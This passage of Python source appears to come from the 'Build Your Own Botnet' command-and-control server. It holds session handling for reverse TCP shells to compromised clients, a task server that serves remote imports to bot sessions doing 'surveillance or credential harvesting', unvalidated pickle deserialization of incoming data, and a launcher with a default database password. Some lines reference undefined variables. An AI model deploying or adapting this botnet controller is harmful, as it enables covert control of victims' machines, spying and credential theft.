            self._server    = server
            self._prompt    = None
            self._active    = threading.Event()
            self._created   = time.time()
            self.id         = id
            self.connection = connection
            self.key        = security.diffiehellman(self.connection)
            self.info       = self._info()


        def _client_prompt(self, data):
            with Server._lock:
                return raw_input(globals()['_threads']['server']._prompt_color + globals()['_threads']['server']._prompt_style + '\n' + bytes(data).rstrip())


        def _error(self, data):
            with Server._lock:
                print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Client {} Error: '.format(self.session) + bytes(data) + '\n')


        def _kill(self):
            self._active.clear()
            globals()['_threads']['server'].session_remove(self.session)
            globals()['_threads']['server'].current_session = None
            globals()['_threads']['server']._active.set()
            globals()['_threads']['server'].run()


        def _info(self):
            try:
                header_size = struct.calcsize("L")
                header      = self.connection.recv(header_size)
                msg_size    = struct.unpack(">L", header)[0]
                msg         = ""
                while len(msg) < msg_size:
                    msg += self.connection.recv(1)
                if msg:
                    info = security.decrypt_aes(msg, self.key)
                    info = json.loads(data)
                    info2 = globals()['_threads']['server'].database.handle_session(info)
                    if isinstance(info2, dict):
                        info = info2
                    globals()['_threads']['server'].send_task(json.dumps(info), session=self.session)
                    return info
            except Exception as e:
                self._error(str(e))


        def status(self):
            """
            Check the status and duration of the session
            
            """
            try:
                c = time.time() - float(self._created)
                data=['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
                      '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
                      '{} minutes'.format(int((c % 3600.0) / 60.0)) if int((c % 3600.0) / 60.0) else str(),
                      '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
                return ', '.join([i for i in data if i])
            except Exception as e:
                return "{} error: {}".format(self.status.func_name, str(e))


        def run(self):
            """
            Run a reverse TCP shell
            
            """
            while True:
                try:
                    if self._active.wait():
                        
                        task = globals()['_threads']['server'].recv_task(session=self.id) if not self._prompt else self._prompt

                        if 'help' in task.get('task'):
                            self._active.clear()
                            globals()['_threads']['server'].help(task.get('result'))
                            self._active.set()
                            
                        elif 'prompt' in task.get('task'):                        
                            self._prompt = task
                            command = self._client_prompt(task.get('result') % int(self.id))
                            cmd, _, action  = command.partition(' ')
                            
                            if cmd in ('\n', ' ', ''):
                                continue

                            elif cmd in globals()['_threads']['server'].commands and cmd != 'help':                            
                                result = globals()['_threads']['server'].commands[cmd](action) if len(action) else globals()['_threads']['server'].commands[cmd]()
                                if result:
                                    task = {'task': cmd, 'result': result, 'session': self.info.get('uid')}
                                    globals()['_threads']['server'].display(result)
                                    globals()['_threads']['server'].database.handle_task(task)
                                continue

                            else:
                                task = {'task': command, 'session': self.info.get('uid')}
                                globals()['_threads']['server'].database.handle_task(task)
                                globals()['_threads']['server'].send_task(task, session=self.id)

                        else:
                            if task.get('result') and task.get('result') != 'None':
                                globals()['_threads']['server'].display(task.get('result'))
                                globals()['_threads']['server'].database.handle_task(task)

                        if globals()['_abort']:
                            break
                        
                        self._prompt = None
                        
                except Exception as e:
                    self._error(str(e))
                    time.sleep(1)
                    break
                
            self._active.clear()
            globals()['_threads']['server']._return()

    class TaskServer(SocketServer.ThreadingTCPServer):
        """
        - Remote imports
            hosts Python packages and user-defined modules
            for remote importing by authenticated sessions

        - Resource requests 
            serves files/resources requested by sessions 
            operating in passive mode (i.e. non-interactive
            sessions doing automated tasks, such as
            surveillance or credential harvesting)
            
        - Completed tasks
            handles incoming tasks completed by clients
            operating in passive mode and passes them to
            the database for storage
        
        """
        
        allow_reuse_address = True

        def __init__(self, server, host='0.0.0.0', port=1338):
            """
            Create a new task server instance

            `Required`
            :param server:      byob.server.Server instance

            `Optional`
            :param str host:    IPv4 address
            :param int port:    port number
            
            """
            SocketServer.ThreadingTCPServer.__init__(self, (host, port), C2.TaskHandler)
            self._server    = server
            self.timeout    = 1.0
            self.abort      = False


        def serve_until_stopped(self):
            while True:
                rd, wr, ex = select.select([self.socket.fileno()], [], [], self.timeout)
                if rd:
                    self.handle_request()
                abort = self.abort
                if abort:
                    break
        
    class TaskHandler(SocketServer.StreamRequestHandler):
        """
        Request Handler for TCP Server
        that handles incoming requests from
        clients operating in passive mode
        
        """
        def handle(self):
            """
            Unpack, decrypt, and unpickle an incoming
            completed task from a client, and pass it
            to the Database for storage
            
            """
            while True:
                try:
                    bits = self.connection.recv(4)
                    if len(bits) < 4:
                        break
                    size = struct.unpack('!L', bits)[0]
                    buff = self.connection.recv(size)
                    while len(buff) < size:
                        buff += self.connection.recv(size - len(buff))
                    task = pickle.loads(buff)
                    if isinstance(task, dict):
                        self._server.database.handle_task(task)
                    else:
                        globals()['_debugger'].debug(str(e))
                except Exception as e:
                    globals()['_debugger'].error(str(e))


def main():
    parser   = argparse.ArgumentParser(prog='server.py', description="Command & Control Server (Build Your Own Botnet)", version='0.1.3')
    server   = parser.add_argument_group('server')
    database = parser.add_argument_group('database')
    server.add_argument('--host', dest='h', metavar='HOST', action='store', type=str, default='0.0.0.0', help='server hostname or IP address')
    server.add_argument('--port', dest='p', metavar='PORT', action='store', type=int, default=1337, help='server port number')
    database.add_argument('--mysql-host', dest='host', metavar='HOST', action='store', type=str, default='localhost', help='mysql hostname')
    database.add_argument('--mysql-port', dest='port', metavar='PORT', action='store', type=int, default=3306, help='mysql port number')
    database.add_argument('--mysql-user', dest='user', metavar='USER', action='store', type=str, default='root', help='mysql login')
    database.add_argument('--mysql-pass', dest='pass', metavar='PASS', action='store', type=str, default='toor', help='mysql password')

    try:
        options = parser.parse_args()
        globals()['_debug'] = options.debug
        globals()['_threads']['server']  = C2(**dict(options._get_kwargs()))
        globals()['_threads']['server'].start()
    except Exception as e:
        util.display("\n[-] ", color='red', style='bright', end='')
        util.display("Error: {}\n".format(str(e)), color='reset', style='dim')
        parser.print_help()
        sys.exit(0)

if __name__ == '__main__':
    main()
